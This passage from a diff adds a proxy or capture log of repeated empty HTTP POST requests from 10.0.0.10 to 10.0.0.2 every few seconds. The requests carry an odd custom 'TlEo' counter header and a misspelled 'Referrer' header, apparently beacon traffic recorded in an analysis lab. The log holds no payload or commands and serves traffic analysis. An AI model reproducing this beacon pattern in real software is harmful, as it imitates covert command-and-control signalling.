+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:45:20'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49379</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>88</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:45:20'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49379</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:45:23'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:45:23'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49380</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:45:23'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000059
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000059</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:45:23'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49380</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>89</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:45:23'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49380</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:45:25'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:45:25'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49381</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:45:25'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:0000005a
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>0000005a</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:45:25'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49381</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>90</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:45:25'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49381</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:45:28'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:45:28'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49382</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:45:28'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:0000005b
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>0000005b</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:45:28'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49382</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>91</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:45:28'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49382</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:45:31'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:45:31'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49383</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:45:31'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:0000005c
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>0000005c</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:45:31'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49383</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>92</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:45:31'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49383</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:45:34'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:45:34'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49384</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:45:34'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:0000005d
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>0000005d</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:45:34'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49384</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>93</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:45:34'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49384</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:45:37'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:45:37'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49385</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:45:37'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:0000005e
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>0000005e</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:45:37'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49385</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>94</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:45:37'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49385</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:45:40'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:45:40'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49386</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:45:40'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:0000005f
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>0000005f</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:45:40'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49386</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>95</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:45:40'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49386</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:45:43'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:45:43'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49387</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:45:43'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000060
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000060</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:45:43'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49387</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>96</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:45:43'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49387</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:45:46'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:45:46'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49388</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:45:46'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000061
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000061</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:45:46'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49388</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>97</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:45:46'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49388</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:45:49'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:45:49'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49389</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:45:49'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000062
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000062</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:45:49'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49389</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>98</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:45:49'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49389</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:45:51'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:45:51'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49390</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:45:51'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000063
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000063</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:45:51'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49390</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>99</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:45:51'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49390</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:45:54'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:45:54'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49391</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:45:54'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000064
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000064</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:45:54'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49391</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>100</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:45:54'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49391</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:45:57'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:45:57'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49392</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:45:57'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000065
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000065</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:45:57'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49392</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>101</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:45:57'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49392</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:46:00'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:46:00'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49393</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:46:00'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000066
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000066</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:46:00'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49393</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>102</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:46:00'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49393</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:46:03'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:46:03'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49394</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:46:03'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000067
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000067</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:46:03'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49394</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>103</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:46:03'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49394</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:46:06'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:46:06'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49395</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:46:06'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000068
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000068</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:46:06'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49395</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>104</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:46:06'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49395</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:46:09'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:46:09'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49396</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:46:09'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000069
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000069</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:46:09'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49396</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>105</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:46:09'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49396</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:46:11'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:46:11'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49397</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:46:11'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:0000006a
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>0000006a</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:46:11'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49397</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>106</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:46:11'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49397</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:46:14'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:46:14'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49398</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:46:14'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:0000006b
